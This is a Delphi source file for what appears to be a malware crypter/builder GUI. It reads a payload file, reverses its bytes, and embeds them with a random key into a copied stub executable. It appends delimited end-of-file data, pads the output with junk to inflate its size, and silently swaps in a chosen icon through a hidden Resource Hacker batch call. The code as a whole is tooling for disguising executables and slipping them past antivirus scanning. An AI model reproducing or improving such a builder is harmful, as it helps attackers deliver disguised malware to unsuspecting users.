unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,EditSvr,RCx, ExtCtrls,IconChanger,ShellApi, XPMan,
  ComCtrls;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    Label2: TLabel;
    Edit2: TEdit;
    Button2: TButton;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    Edit4: TEdit;
    Label4: TLabel;
    Button5: TButton;
    GroupBox2: TGroupBox;
    Image1: TImage;
    Button6: TButton;
    OpenDialog2: TOpenDialog;
    XPManifest1: TXPManifest;
    Timer1: TTimer;
    GroupBox1: TGroupBox;
    Label3: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Button3: TButton;
    GroupBox3: TGroupBox;
    Label7: TLabel;
    Edit3: TEdit;
    Label8: TLabel;
    Label9: TLabel;
    ProgressBar1: TProgressBar;
    UpDown1: TUpDown;
    Memo1: TMemo;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  icopath : string;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
  if OpenDialog1.Execute then Edit1.text := Opendialog1.FileName;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if OpenDialog1.Execute then Edit2.text := Opendialog1.FileName;
end;

//====================================================
function File2String(FileName: string): string;
var
 MyStream: TFileStream;
 MyString: string;
begin
 MyStream := TFileStream.Create(FileName, fmOpenRead
   or fmShareDenyNone);
 try
   MyStream.Position := 0;
   SetLength(MyString, MyStream.Size);
   MyStream.ReadBuffer(Pointer(MyString)^, MyStream.Size);
 finally
   MyStream.Free;
 end;
 Result := MyString;
end;

function Reverse(const rev : string) : string;
var
  a, b : integer;
begin
  b := Length(rev);
  SetLength(Result, b);
  for a := 1 to (Length(rev) div 2) do
  begin
    Result[a] := rev[b];
    Result[b] := rev[a];
    Dec(b);
  end;
end;
//====================================================

function RandomPassword(PLen: Integer): string;
var
  str: string;
begin
  Randomize;
  //string with all possible chars
  str    := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = PLen)
end;

function WriteEof(FileName, Res, Delimit1, Delimit2 :String) :String;
var
  F: TextFile;
begin
  AssignFile(F,FileName);
  Append(F);
  Writeln(F,Delimit1+Res+Delimit2);
  CloseFile(F);
end;

//===================================================
procedure String2File(String2BeSaved, FileName: string);
var
 MyStream: TMemoryStream;
begin
 if String2BeSaved = '' then exit;
 SetCurrentDir(ExtractFilePath(Application.ExeName));
 MyStream := TMemoryStream.Create;
 try
   MyStream.WriteBuffer(Pointer(String2BeSaved)^, Length(String2BeSaved));
   MyStream.SaveToFile(FileName);
 finally
   MyStream.Free;
 end;
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  Build:TBuilder;
  input_data,icocommand:string;
  ready : boolean;
  I : integer;
begin
  ProgressBar1.Position := 0;
  ready := false;
  if savedialog1.Execute then
  begin
    // read input file
    if edit1.Text <> ''  then
    begin
      input_data := File2String(edit1.text);
      if input_data <> '' then ready := true;
    end;
    if ready = true then
    begin
      Randomize;
      ProgressBar1.StepBy(Random(25));
      // copy stub to destination
      CopyFile(Pchar(edit2.text),PChar(savedialog1.filename),false);
      // write settings
      Build := TBuilder.Create;
      Build.Settings[0] := reverse(input_data);
      Build.WriteSettings(savedialog1.FileName,edit4.text);
      ProgressBar1.StepBy(Random(25));
      WriteEof(SaveDialog1.FileName,edit4.text,'#D#', '(P)');
      ProgressBar1.StepBy(Random(25));
      if (Edit3.Text <> '0') and (Edit3.text <> '') then
      begin
        For I := 0 to (StrToInt(Edit3.text)) do
        begin
          WriteEof(SaveDialog1.FileName,Memo1.text,IntToStr(Random(999)),IntToStr(Random(999)));
        end;
      end;
      ProgressBar1.StepBy(Random(25));
      if icopath <> '' then
      begin
        // icon (do last)
        if icopath <> '' then
        begin
          icocommand := '"' + ExtractFilePath(Application.ExeName)+'ResHack\RS.exe" -addoverwrite "' + SaveDialog1.FileName + '", "' + SaveDialog1.FileName + '", "' + icopath + '", ICONGROUP, MAINICON, 2057';
          String2File(icocommand,ExtractFilePath(Application.ExeName)+'ResHack\change.bat');
          ShellExecute(0,'open',Pchar(ExtractFilePath(Application.ExeName)+'ResHack\change.bat'),nil,nil,SW_HIDE);
        end;
      end;
      ProgressBar1.StepBy(Random(25));
    end;
  end;
  ProgressBar1.Position := ProgressBar1.Max;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
  Edit4.Text := RandomPassword(8);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  edit4.Text := RandomPassword(8);
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
  if opendialog2.Execute then icopath := opendialog2.FileName;
  image1.Picture.LoadFromFile(icopath);
end;

function FileSize(const aFilename: String): Int64;
  var
    info: TWin32FileAttributeData;
  begin
    result := -1;

    if NOT GetFileAttributesEx(PChar(aFileName), GetFileExInfoStandard, @info) then
      EXIT;

    result := info.nFileSizeLow or (info.nFileSizeHigh shl 32);
  end;

//Format file byte size
 function FormatByteSize(const bytes: Longint): string;
 const
   B = 1; //byte
   KB = 1024 * B; //kilobyte
   MB = 1024 * KB; //megabyte
   GB = 1024 * MB; //gigabyte
 begin
   if bytes > GB then
     result := FormatFloat('#.## GB', bytes / GB)
   else
     if bytes > MB then
       result := FormatFloat('#.## MB', bytes / MB)
     else
       if bytes > KB then
         result := FormatFloat('#.## KB', bytes / KB)
       else
         result := FormatFloat('#.## bytes', bytes) ;
 end;
procedure TForm1.Timer1Timer(Sender: TObject);
begin
  if edit1.text <> '' then
  begin
    if edit2.Text <> '' then
    begin
      Label3.Caption := 'Size : ' + ForMatByteSize(FileSize(edit1.text) + FileSize(edit2.text) + ((StrToInt(Edit3.text)*1024)*1024));
      label3.Font.Color := clGreen;
    end;
  end;
  if icopath <> '' then
  begin
    label5.Caption := 'Icon : Yes';
    label5.Font.Color := clGreen;
  end
  else
  begin
    label5.Caption := 'Icon : No';
    label5.Font.Color := clRed;
  end;
end;

end.
